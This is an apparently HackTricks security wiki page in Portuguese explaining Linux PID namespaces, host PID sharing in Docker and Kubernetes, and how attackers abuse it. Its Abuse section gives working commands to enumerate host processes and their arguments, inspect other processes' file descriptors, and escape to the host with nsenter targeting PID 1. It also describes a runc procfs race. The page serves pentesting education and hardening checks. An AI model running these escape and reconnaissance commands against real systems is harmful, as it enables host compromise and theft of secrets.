# Espaço de nomes PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O PID namespace controla como os processos são numerados e quais processos são visíveis. É por isso que um container pode ter seu próprio PID 1 mesmo não sendo uma máquina real. Dentro do namespace, a carga de trabalho vê o que parece ser uma árvore de processos local. Fora do namespace, o host ainda vê os PIDs reais do host e todo o panorama de processos.

Do ponto de vista de segurança, o PID namespace importa porque a visibilidade de processos é valiosa. Uma vez que uma carga de trabalho consegue ver processos do host, ela pode observar nomes de serviços, argumentos da linha de comando, segredos passados em argumentos de processo, estado derivado do ambiente através de `/proc`, e potenciais alvos para entrada em namespaces. Se ela puder fazer mais do que apenas ver esses processos, por exemplo enviando sinais ou usando ptrace sob as condições certas, o problema se torna muito mais sério.

## Funcionamento

Um novo PID namespace começa com sua própria numeração interna de processos. O primeiro processo criado dentro dele torna-se PID 1 do ponto de vista do namespace, o que também significa que recebe semântica especial similar ao init para filhos órfãos e comportamento de sinais. Isso explica muitas das peculiaridades de containers em torno de processos init, zombie reaping, e por que pequenos init wrappers são às vezes usados em containers.

A lição de segurança importante é que um processo pode parecer isolado porque vê apenas sua própria árvore de PIDs, mas esse isolamento pode ser removido deliberadamente. Docker expõe isso através de `--pid=host`, enquanto Kubernetes faz isso através de `hostPID: true`. Uma vez que o container entra no PID namespace do host, a carga de trabalho vê diretamente os processos do host, e muitos caminhos de ataque posteriores tornam-se muito mais realistas.

## Laboratório

Para criar um PID namespace manualmente:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
O shell agora vê uma visão privada dos processos. A flag `--mount-proc` é importante porque monta uma instância de procfs que corresponde ao novo PID namespace, tornando a lista de processos coerente quando vista de dentro.

Para comparar o comportamento do container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
A diferença é imediata e fácil de entender, por isso este é um bom primeiro laboratório para os leitores.

## Runtime Usage

Contêineres normais no Docker, Podman, containerd e CRI-O recebem seu próprio namespace PID. Os Pods do Kubernetes normalmente também recebem uma visão PID isolada, a menos que a carga de trabalho solicite explicitamente o compartilhamento do PID do host. Ambientes LXC/Incus dependem da mesma primitiva do kernel, embora casos de uso com contêineres do sistema possam expor árvores de processo mais complicadas e incentivar mais atalhos de depuração.

A mesma regra vale em todos os lugares: se o runtime optou por não isolar o namespace PID, isso é uma redução deliberada no limite do contêiner.

## Misconfigurations

A má configuração canônica é o compartilhamento do PID do host. Equipes frequentemente o justificam por conveniência de depuração, monitoramento ou gerenciamento de serviços, mas isso deve sempre ser tratado como uma exceção de segurança significativa. Mesmo se o contêiner não tiver uma primitiva de escrita imediata sobre os processos do host, apenas a visibilidade já pode revelar muito sobre o sistema. Uma vez que capacidades como `CAP_SYS_PTRACE` ou acesso útil ao procfs são adicionados, o risco aumenta significativamente.

Outro erro é presumir que, porque a carga de trabalho não pode matar ou ptrace processos do host por padrão, o compartilhamento do PID do host é, portanto, inofensivo. Essa conclusão ignora o valor da enumeração, a disponibilidade de alvos de entrada em namespaces e a forma como a visibilidade de PID se combina com outros controles enfraquecidos.

## Abuse

Se o namespace PID do host for compartilhado, um atacante pode inspecionar processos do host, coletar argumentos de processo, identificar serviços interessantes, localizar PIDs candidatos para `nsenter`, ou combinar a visibilidade de processos com privilégios relacionados ao ptrace para interferir no host ou em cargas de trabalho vizinhas. Em alguns casos, simplesmente ver o processo de longa duração certo é suficiente para remodelar o restante do plano de ataque.

O primeiro passo prático é sempre confirmar que os processos do host estão realmente visíveis:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Uma vez que os PIDs do host estejam visíveis, os argumentos dos processos e os alvos de entrada de namespace frequentemente se tornam a fonte de informação mais útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Se `nsenter` estiver disponível e houver privilégios suficientes, teste se um processo do host visível pode ser usado como ponte de namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Mesmo quando a entrada é bloqueada, host PID sharing já é valioso porque revela o layout dos serviços, componentes em tempo de execução e processos privilegiados candidatos para serem alvos em seguida.

Host PID visibility também torna file-descriptor abuse mais realista. Se um processo host privilegiado ou uma workload vizinha tiver um arquivo sensível ou socket aberto, o atacante pode ser capaz de inspecionar `/proc/<pid>/fd/` e reutilizar esse handle dependendo da propriedade, procfs mount options e do modelo de serviço alvo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Esses comandos são úteis porque respondem se `hidepid=1` ou `hidepid=2` está reduzindo a visibilidade entre processos e se descritores obviamente interessantes, como arquivos secretos abertos, logs ou Unix sockets, são visíveis.

### Exemplo completo: PID do host + `nsenter`

O compartilhamento do PID do host torna-se uma evasão direta para o host quando o processo também tem privilégios suficientes para entrar nos namespaces do host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Se o comando for bem-sucedido, o processo do container estará agora sendo executado nos namespaces mount, UTS, network, IPC e PID do host. O impacto é o comprometimento imediato do host.

Mesmo quando `nsenter` estiver ausente, o mesmo resultado pode ser alcançado através do binário do host se o sistema de arquivos do host estiver montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recentes de tempo de execução

Alguns ataques relacionados ao namespace PID não são as tradicionais más configurações `hostPID: true`, mas sim bugs de implementação em tempo de execução relacionados a como as proteções do procfs são aplicadas durante a configuração do container.

#### `maskedPaths` race to host procfs

Em versões vulneráveis do `runc`, atacantes capazes de controlar a imagem do container ou a carga de trabalho `runc exec` podiam competir com a fase de mascaramento substituindo o `/dev/null` do container por um symlink para um caminho sensível do procfs, como `/proc/sys/kernel/core_pattern`. Se a corrida tivesse sucesso, o bind mount do masked-path poderia acabar no alvo errado e expor parâmetros globais do procfs do host ao novo container.

Comando útil para revisão:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Isto é importante porque o impacto eventual pode ser o mesmo que uma exposição direta do procfs: `core_pattern` ou `sysrq-trigger` graváveis, seguida pela execução de código no host ou negação de serviço.

#### Namespace injection with `insject`

Namespace injection tools such as `insject` mostram que a interação com o PID-namespace nem sempre requer entrar no namespace alvo antes da criação do processo. Um auxiliar pode anexar-se posteriormente, usar `setns()` e executar enquanto preserva a visibilidade no espaço PID do alvo:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Esse tipo de técnica importa principalmente para depuração avançada, ferramentas ofensivas e fluxos de trabalho pós-exploração onde o contexto de namespace precisa ser unido depois que o runtime já inicializou a workload.

### Related FD Abuse Patterns

Dois padrões valem ser destacados explicitamente quando os PIDs do host estão visíveis. Primeiro, um processo privilegiado pode manter um descritor de arquivo sensível aberto através de `execve()` porque ele não foi marcado `O_CLOEXEC`. Segundo, serviços podem passar descritores de arquivo por sockets Unix via `SCM_RIGHTS`. Em ambos os casos o objeto interessante não é mais o pathname, mas o handle já-aberto que um processo de menor privilégio pode herdar ou receber.

Isso é relevante em trabalho com containers porque o handle pode apontar para `docker.sock`, um log privilegiado, um arquivo secreto do host, ou outro objeto de alto valor mesmo quando o caminho em si não é diretamente acessível a partir do sistema de arquivos do container.

## Verificações

O propósito desses comandos é determinar se o processo tem uma visão privada de PID ou se ele já pode enumerar um panorama de processos muito mais amplo.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
O que é interessante aqui:

- Se a lista de processos contiver serviços óbvios do host, o compartilhamento de PID do host provavelmente já está em vigor.
- Ver apenas uma pequena árvore local do contêiner é o padrão normal; ver `systemd`, `dockerd`, ou daemons não relacionados não é.
- Uma vez que os PIDs do host estejam visíveis, mesmo informações de processo somente leitura tornam-se úteis para reconhecimento.

Se você descobrir um contêiner rodando com compartilhamento de PID do host, não o trate como uma diferença cosmética. Trata-se de uma mudança importante no que a carga de trabalho pode observar e potencialmente afetar.
{{#include ../../../../../banners/hacktricks-training.md}}
